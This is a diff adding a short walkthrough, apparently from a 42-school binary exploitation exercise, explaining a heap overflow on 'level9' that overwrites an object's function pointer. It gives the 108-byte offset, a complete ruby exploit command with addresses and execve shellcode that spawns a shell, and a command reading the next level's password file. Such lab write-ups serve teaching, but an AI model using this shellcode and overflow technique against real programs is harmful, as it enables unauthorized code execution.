@@ -1,0 +1,26 @@
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    walkthrough                                        :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2021/04/25 13:41:50 by fcadet            #+#    #+#              #
+#    Updated: 2021/04/25 16:44:53 by fcadet           ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
+
+- n3 is allocated after n4 so n1->fn can be overrided trough n2->str
+
+- thanks to ltrace we can find the offset between those to addresses
+	- n4 @ 0x804a008 & n3 @ 0x804a078
+	- n1->fn is @ 0x804a078 - (0x804a008 + 0x4) = 108 bytes from n2->str
+- so we have to write 108 bytes until n1->fn, and then simulate a double deferencement
+by jumping 2 times to the next 4 bytes (one for the VT entry and one to access
+instructions through function pointer).
+- finally we can append our shellcode
+
+- here is out exploit command
+	- ./level9 $(ruby -e 'print "x" * 108 + "\x7c\xa0\x04\x08" + "\x80\xa0\x04\x08" +
+	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80"')
+	- cat /home/user/bonus0/.pass
